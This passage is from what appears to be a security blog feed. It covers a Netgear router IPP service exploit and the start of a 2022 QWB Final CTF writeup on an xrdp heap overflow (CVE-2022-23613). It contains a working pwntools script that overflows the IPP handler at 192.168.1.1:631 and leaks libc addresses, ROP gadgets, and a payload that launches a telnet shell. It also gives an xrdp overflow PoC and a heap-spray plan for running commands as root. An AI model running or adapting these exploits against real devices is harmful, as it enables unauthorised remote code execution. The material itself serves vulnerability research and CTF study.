<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>第二处 <code>final_ptr = malloc(++final_size);</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们得让 <code>final_size</code> 的值不能太大，不然分配不出来程序就不会走到 <code>write_ipp_response</code> 里，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868↑j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure><p>即需要设置 <code>[R11, #-0x18]</code> 的值， 这是在栈上的。 最后我 leak 的代码大致如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = <span class="built_in">bytearray</span>(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ <span class="built_in">len</span>(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span>-<span class="number">0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = <span class="built_in">bytes</span>(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % <span class="built_in">str</span>(<span class="built_in">len</span>(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Leak:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>通过泄漏 uclibc 的地址， 然后可以计算 <code>system</code>  的地址。 然后我们就可以进一步做劫持返回地址工作。首先我们需要有个一个地址来存储我们 <code>system</code> 将执行的字符串。 回顾上文， 我们提及到了系统的随机化等级为 <code>1</code> 。</p><p>系统随机化开启情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>因此我们可以在堆上查找是否有可控的内容， 通过 <code>hexdump</code> 查找。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p><p>我们发现我们的 payload 会存储在 堆上， 因此 ， 我们可以将要执行的命令， 在第一次链接的时候 ， 就将命令写入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (<span class="built_in">len</span>(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ <span class="built_in">len</span>(cmd)] = cmd</span><br></pre></td></tr></table></figure><p>在覆盖返回地址之前 ， 除了在 leak 需要注意的那几个变量以外 ，我们还需要单独注意</p><ul><li>flag1</li><li>v17</li><li>response_len</li></ul><p>等变量的值， 要单独重新赋值。</p><p>最后我们需要将 <code>R0</code> 的值指向堆上的 <code>0x1b880</code> 地址。 所以我们需要单独几个 <code>gadget</code> ， 这里我使用的是两个 <code>gadget</code> 。</p><p>首先通过第一个  <code>gadget</code>  控制 <code>R3</code>  为 0x1b880</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure><p>然后通过 第二个 <code>gadget</code>  将 <code>R3</code> 的值赋值给 <code>R0</code> 并且控制 PC 跳转到 <code>system</code> 函数上，从而完成任意命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>最后就可以完成任意命令执行了。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 – Pwn2Own Austin Presentations</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>2022 QWB Final RealWorld Challenge Writeup</title>
    <link href="https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html"/>
    <id>https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html</id>
    <published>2022-08-23T16:00:00.000Z</published>
    <updated>2023-04-29T08:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年与0x300R的小伙伴参与了 2022 QWB Final  ， 在这次比赛中我和小伙伴们 解决了不少 RW 题目， 而我本人参与的一共有三道路由器题、一道 RDP 提权 、 一道 VPN  题目。在此我简单记述下其中的路由器题以及 RDP 题目， 而 VPN 题目涉及一些别的事情，就不方便公开。</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>题目要求我们攻击 XRDP 然后进行本地提权的效果 ， 获取ubuntu操作系统root权限， 并在/目录成功写入内容包含队伍特征的flag文件。</p><p>程序版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@RDP:/home/rdp/Desktop<span class="comment"># xrdp-sesman -version</span></span><br><span class="line">xrdp-sesman 0.9.18</span><br><span class="line">  The xrdp session manager</span><br><span class="line">  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.</span><br><span class="line">  See https://github.com/neutrinolabs/xrdp <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">  Configure options:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该版本受到 <code>CVE-2022-23613</code> 影响</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>补丁代码： <a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="addition">+ #define HEADER_SIZE 8</span></span><br><span class="line">    int version;</span><br><span class="line">    int size;</span><br><span class="line"></span><br><span class="line">    if (self-&gt;extra_flags == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line"><span class="deletion">-        if (size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line"><span class="addition">+        if (size &lt; HEADER_SIZE || size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="deletion">-            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size&quot;);</span></span><br><span class="line"><span class="addition">+            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size %d&quot;, size);</span></span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line"><span class="meta">@@ -302,11 +303,12 @@</span> sesman_data_in(struct trans *self)</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        /* reset for next message */</span><br><span class="line"><span class="deletion">-        self-&gt;header_size = 8;</span></span><br><span class="line"><span class="addition">+        self-&gt;header_size = HEADER_SIZE;</span></span><br><span class="line">        self-&gt;extra_flags = 0;</span><br><span class="line">        init_stream(self-&gt;in_s, 0); /* Reset input stream pointers */</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"><span class="addition">+ #undef HEADER_SIZE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************************/</span><br></pre></td></tr></table></figure><p>通过分析补丁，我们知道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/sesman/sesman.c#L282</span></span><br><span class="line"></span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;extra_flags == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line">        <span class="keyword">if</span> (size &gt; self-&gt;in_s-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            LOG(LOG_LEVEL_ERROR, <span class="string">&quot;sesman_data_in: bad message size&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">        self-&gt;extra_flags = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里被加了检查的 <code>size</code> 会被赋值到 <code>self-&gt;header_size</code> 中， 如果我们将 <code>size</code> 即 <code>self-&gt;header_size</code>  设置成一个<code>0x80000000</code>， </p><p>那么可能在 溢出点： <a href="https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383">https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">            &#125;</span><br><span class="line">            read_so_far = (<span class="keyword">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line">            to_read = self-&gt;header_size - read_so_far;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (to_read &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read); <span class="comment">// trans_tcp_recv</span></span><br></pre></td></tr></table></figure><p>造成缓冲区溢出：</p><p>因此我们尝试构造如下 PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">3350</span>))</span><br><span class="line">    sdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">0x2222CCCC</span>) <span class="comment">#version</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="number">0x80000000</span>) <span class="comment">#headersize</span></span><br><span class="line">    s.send(sdata)</span><br><span class="line">    <span class="built_in">print</span>(sdata)</span><br><span class="line">    sdata = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x10000</span>  </span><br><span class="line">    s.send(sdata)</span><br></pre></td></tr></table></figure><p>并在对应的地方下断点， 在调试器中可以看到：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png"></a></p><p><code>r8d</code> 为 <code>self-&gt;header_size</code> 0x80000000<code>，</code>read_so_far<code>为</code>0x9` ， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png"></a></p><p>相减完后是个负数，在拷贝的时候会发生 <code>heap overflow</code></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>出题人修改了 <code>MAX_SHORT_LIVED_CONNECTIONS</code></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/sesman/sesman.c b/sesman/sesman.c</span></span><br><span class="line"><span class="comment">index a8576905..38a2f642 100644</span></span><br><span class="line"><span class="comment">--- a/sesman/sesman.c</span></span><br><span class="line"><span class="comment">+++ b/sesman/sesman.c</span></span><br><span class="line"><span class="meta">@@ -40,7 +40,7 @@</span></span><br><span class="line">  * At the moment, all connections to sesman are short-lived. This may change</span><br><span class="line">  * in the future</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define MAX_SHORT_LIVED_CONNECTIONS 16</span></span><br><span class="line"><span class="addition">+#define MAX_SHORT_LIVED_CONNECTIONS 512</span></span><br><span class="line"></span><br><span class="line"> struct sesman_startup_params</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>因此我们可以通过堆喷，覆盖结构体指针来达到控制 PC 的目的， 通过代码阅读，我们发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *</span></span><br><span class="line"><span class="class"><span class="title">trans_create</span>(<span class="title">int</span> <span class="title">mode</span>, <span class="title">int</span> <span class="title">in_size</span>, <span class="title">int</span> <span class="title">out_size</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *<span class="title">self</span> =</span> (struct trans *) <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    self = (struct trans *) g_malloc(<span class="keyword">sizeof</span>(struct trans), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        make_stream(self-&gt;in_s);</span><br><span class="line">        init_stream(self-&gt;in_s, in_size);</span><br><span class="line">        make_stream(self-&gt;out_s);</span><br><span class="line">        init_stream(self-&gt;out_s, out_size);</span><br><span class="line">        self-&gt;mode = mode;</span><br><span class="line">        self-&gt;tls = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* assign tcp calls by default */</span></span><br><span class="line">        self-&gt;trans_recv = trans_tcp_recv;</span><br><span class="line">        self-&gt;trans_send = trans_tcp_send;</span><br><span class="line">        self-&gt;trans_can_recv = trans_tcp_can_recv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以通过使用 <code>trans_create</code> 函数来做堆喷。且分配出来的 <code>trans *self</code>  对象拥有函数指针，我们只需覆盖 <code>self-&gt;trans_recv</code> 就能控制 PC。另外程序没有开启 PIE， 且程序本身有 <code>g_execlp3</code> 之类的执行代码的函，题目又只要求本地提权即可，所以利用思路比较清晰。</p><ol><li>创建多个链接，进行堆喷</li><li>溢出覆盖 <code>self-&gt;trans_recv</code> 为 <code>g_execlp3</code> ， 且控制 <code>RDI</code> 为我们执行的命令 (要绝对路径)</li><li>调用 <code>self-&gt;trans_recv</code> 执行任意命令</li></ol><h2 id="totox-3"><a href="#totox-3" class="headerlink" 